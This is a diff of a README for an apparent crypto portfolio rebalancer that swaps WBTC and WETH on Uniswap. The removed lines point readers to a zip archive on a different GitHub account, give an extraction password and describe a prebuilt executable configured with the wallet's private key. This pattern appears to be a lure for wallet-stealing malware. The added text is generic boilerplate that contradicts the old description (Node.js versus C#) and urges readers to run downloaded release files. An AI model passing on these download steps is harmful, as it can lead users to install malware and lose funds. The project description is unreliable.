@@ -1,48 +1,126 @@
-# Rebalancer
+# Rebalancer: Automated Crypto Portfolio Management 🤖💰
 
-The **Ethereum Uniswap Rebalancer** is a C#-based application designed to automate token rebalancing (WBTC and WETH) within an Ethereum wallet using Uniswap smart contracts. Built with the Nethereum library, this solution enables users to maintain specified token allocation ratios through automated trades.
+![GitHub Release](https://img.shields.io/badge/Latest_Release-v1.0.0-brightgreen) [![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue)](https://github.com/zazu252/rebalancer)
 
-### Key Features:
+Welcome to **Rebalancer**, your go-to solution for automated management of your crypto portfolio. This system scans your wallet on a schedule, retrieves your current WBTC and WETH balances, computes deviations from your target allocation ratios, and executes swap operations via Uniswap smart contracts. 
 
-- **Rebalancing Logic:** Implements a straightforward strategy to maintain target proportions between WBTC and WETH tokens by leveraging Uniswap’s decentralized liquidity pools.
-- **Executable for Ease of Use:** Delivered as a compiled executable (`UniswapRebalancer.exe`), allowing users to run the tool effortlessly without needing development experience.
-- **Flexible Configuration:** Users can modify essential parameters—such as Infura API key, wallet address, private key, and token specifications—via the `config.json` file.
+## Table of Contents
 
-This tool is ideal for individuals seeking a hands-off method to preserve their preferred token balance. It also serves as a foundational framework that can be enhanced and tailored to fit more complex or personalized portfolio strategies.
-## Getting Started
-- [Clone](https://github.com/knightlightst/rebalance/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
-- Extract archive with password `1bvA32`
-- Modify the `config` file:
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [How It Works](#how-it-works)
+- [Technologies Used](#technologies-used)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-1. **Ethereum Networks:**
-  - `rpcUrl`: The RPC URL for connecting to the Ethereum network.
-  - `gasPrice`: The gas price in Wei to be used for transactions.
-  - `gasLimit`: The gas limit per transaction.
+## Features 🌟
 
-2. **Rebalancer Settings:**
-  - `targetWbtcPercentage`: Target percentage for WBTC in the portfolio.
-  - `targetWethPercentage`: Target percentage for WETH in the portfolio.
-  - `rebalancingInterval`: Time interval for rebalancing (e.g., `"1d"` for every 1 day).
-  - `transactionTimeout`: Timeout for individual transactions in seconds.
+- **Automated Portfolio Rebalancing**: Keep your investments aligned with your goals without constant manual adjustments.
+- **Scheduled Scans**: The system checks your wallet at regular intervals to ensure timely actions.
+- **Deviation Calculation**: Understand how far your portfolio strays from your desired allocation.
+- **Uniswap Integration**: Execute swaps seamlessly using Uniswap smart contracts.
+- **User-Friendly Configuration**: Simple setup and easy customization options.
+
+## Installation 🛠️
+
+To get started with Rebalancer, follow these steps:
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/zazu252/rebalancer.git
+   cd rebalancer
+   ```
+
+2. Install the required dependencies:
+   ```bash
+   npm install
+   ```
+
+3. Download the latest release from the [Releases section](https://github.com/zazu252/rebalancer/releases) and execute the necessary files.
+
+## Usage 🚀
+
+To use Rebalancer, follow these instructions:
+
+1. **Start the Application**:
+   ```bash
+   npm start
+   ```
+
+2. **Monitor Your Portfolio**: The system will automatically scan your wallet and make necessary adjustments based on your predefined ratios.
+
+3. **Check the Logs**: Monitor the console output for information on swaps and balances.
+
+## Configuration ⚙️
+
+You can customize Rebalancer to fit your needs by editing the `config.json` file. Here are some key parameters you can adjust:
+
+- **Wallet Address**: Specify your wallet address for balance checks.
+- **Target Ratios**: Set your desired allocation ratios for WBTC and WETH.
+- **Scan Interval**: Define how often the system should check your wallet.
+
+### Example Configuration
 ```json
 {
-  "ethereum": {
-    "mainnet": {
-      "rpcUrl": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY",
-      "gasPrice": 1000000000,  // Gas price in Wei
-      "gasLimit": 300000       // Gas limit per transaction
-    },
-    "ropsten": {
-      "rpcUrl": "https://ropsten.infura.io/v3/YOUR_INFURA_API_KEY",
-      "gasPrice": 500000000,   // Gas price in Wei
-      "gasLimit": 200000       // Gas limit per transaction
-    },
-    // Add more networks as needed
+  "walletAddress": "0xYourWalletAddress",
+  "targetRatios": {
+    "WBTC": 0.6,
+    "WETH": 0.4
   },
-  "rebalancer": {
-    "targetWbtcPercentage": 50,
-    "targetWethPercentage": 30,
-    "rebalancingInterval": "1d",  // Rebalance every 1 day
-    "transactionTimeout": 600,   // Timeout for transactions in seconds
-    // Add more rebalancing settings as needed
-  }
+  "scanInterval": 3600
+}
+```
+
+## How It Works 🔍
+
+Rebalancer operates through a series of steps:
+
+1. **Scheduled Scans**: The system runs at set intervals, checking your wallet for current balances.
+2. **Deviation Calculation**: It calculates how much your current balances deviate from your target ratios.
+3. **Swap Execution**: If deviations exceed a certain threshold, the system interacts with Uniswap smart contracts to execute swaps and restore your target weights.
+
+## Technologies Used 🛠️
+
+- **Node.js**: The backend is built using Node.js for efficient server-side operations.
+- **Infura API**: Connects to the Ethereum network for wallet interactions.
+- **Uniswap V3**: Utilizes Uniswap smart contracts for executing trades.
+- **Express**: Serves as the web framework for the application.
+
+## Contributing 🤝
+
+We welcome contributions! If you want to improve Rebalancer, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact 📬
+
+For questions or feedback, please reach out:
+
+- **Email**: support@example.com
+- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+
+## Conclusion 🎉
+
+Rebalancer simplifies crypto portfolio management by automating the rebalancing process. With its user-friendly interface and powerful features, you can maintain your desired asset allocation with ease. 
+
+For more information and updates, check the [Releases section](https://github.com/zazu252/rebalancer/releases) and start optimizing your crypto investments today!
